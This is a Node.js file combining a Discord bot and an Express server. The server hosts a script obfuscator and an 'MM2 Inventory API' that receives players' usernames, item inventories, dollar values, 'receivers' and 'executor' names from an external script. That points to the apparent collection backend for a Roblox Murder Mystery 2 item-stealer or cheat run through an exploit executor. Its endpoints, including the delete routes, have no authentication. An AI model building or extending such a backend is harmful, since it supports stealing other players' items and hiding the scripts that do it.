const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const path = require('path');

// Express server for Render health checks
const app = express();
app.use(express.json()); // Parse JSON request bodies
app.get('/', (req, res) => res.send('Discord Bot Running'));

// GNG obfuscator page (static UI + shared engine, same deploy)
app.get('/obfuscator', (req, res) =>
    res.sendFile(path.join(__dirname, 'public', 'obfuscator.html')));
app.get('/engine.js', (req, res) =>
    res.sendFile(path.join(__dirname, 'obfuscator', 'engine.js')));

// ⚠️ ADDED: MM2 Inventory API endpoints
// Simple in-memory storage for inventory data
const inventoryData = new Map();

// Get all inventory data
app.get('/api/inventory', (req, res) => {
    const data = Array.from(inventoryData.entries()).map(([username, data]) => ({
        username,
        ...data
    }));
    res.json(data);
});

// Get specific user's inventory
app.get('/api/inventory/:username', (req, res) => {
    const username = req.params.username;
    const data = inventoryData.get(username);
    if (data) {
        res.json({ username, ...data });
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

// Receive inventory data from script
app.post('/api/inventory', (req, res) => {
    const { username, inventory, totalValue, totalDollar, receivers, executor, placeId, jobId } = req.body;

    if (!username || !inventory) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Store inventory data
    inventoryData.set(username, {
        inventory,
        totalValue,
        totalDollar,
        receivers,
        executor,
        placeId,
        jobId,
        timestamp: new Date().toISOString()
    });

    console.log(`[${new Date().toISOString()}] Inventory received from ${username}`);
    console.log(`  Total Value: ${totalValue}, Total Dollar: $${totalDollar}`);
    console.log(`  Receivers: ${receivers ? receivers.join(', ') : 'none'}`);

    res.json({ success: true, message: 'Inventory data received' });
});

// Clear inventory data
app.delete('/api/inventory/:username', (req, res) => {
    const username = req.params.username;
    inventoryData.delete(username);
    res.json({ success: true, message: 'Inventory data cleared' });
});

// Clear all inventory data
app.delete('/api/inventory', (req, res) => {
    inventoryData.clear();
    res.json({ success: true, message: 'All inventory data cleared' });
});

// ⚠️ END ADDED INVENTORY API

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Keep-alive: ping server every 25 seconds to prevent cold starts
setInterval(() => {
    fetch(`http://localhost:${PORT}`).catch(err => console.error('Keep-alive ping failed:', err));
}, 25000);

// Discord Bot Setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const CHANNEL_ID = process.env.CHANNEL_ID; // Discord channel ID for sync
const BOT_TOKEN = process.env.BOT_TOKEN;

// Store user states: username -> { message, data }
const userStates = new Map();

client.on('ready', () => {
    console.log(`Bot logged in as ${client.user.tag}`);
    console.log(`Syncing in channel: ${CHANNEL_ID}`);
});

// Handle user messages (weapon updates)
client.on('messageCreate', async (message) => {
    // Ignore bot messages and messages from wrong channel
    if (message.author.bot || message.channelId !== CHANNEL_ID) return;
    
    try {
        const data = JSON.parse(message.content);
        
        if (data.username && data.gun !== undefined && data.knife !== undefined) {
            // Store or update user state
            const existingState = userStates.get(data.username);
            
            if (existingState && existingState.message) {
                // Edit existing message
                await existingState.message.edit(message.content);
                userStates.set(data.username, {
                    message: existingState.message,
                    data: data
                });
            } else {
                // Send new message
                const sentMessage = await message.channel.send(message.content);
                userStates.set(data.username, {
                    message: sentMessage,
                    data: data
                });
            }
            
            // Delete user's command message
            await message.delete();
        }
    } catch (error) {
        console.error('Error processing message:', error);
    }
});

// API endpoint to get all user states (for polling fallback)
app.get('/states', (req, res) => {
    const states = {};
    userStates.forEach((value, key) => {
        states[key] = value.data;
    });
    res.json(states);
});

// API endpoint to get specific user state
app.get('/state/:username', (req, res) => {
    const state = userStates.get(req.params.username);
    if (state) {
        res.json(state.data);
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

// API endpoint to update user state (from game clients)
app.post('/state/:username', (req, res) => {
    console.log(`POST /state/${req.params.username} received`);
    console.log('Body:', req.body);
    
    const username = req.params.username;
    const data = req.body;
    
    if (!data || !data.username) {
        console.log('Invalid data - missing username');
        return res.status(400).json({ error: 'Invalid data' });
    }
    
    // Store user state in memory only (fast)
    userStates.set(username, {
        message: null, // Don't use Discord messages for real-time sync
        data: data
    });
    
    console.log(`State stored for ${username}`);
    res.json({ success: true });
});

client.login(BOT_TOKEN);
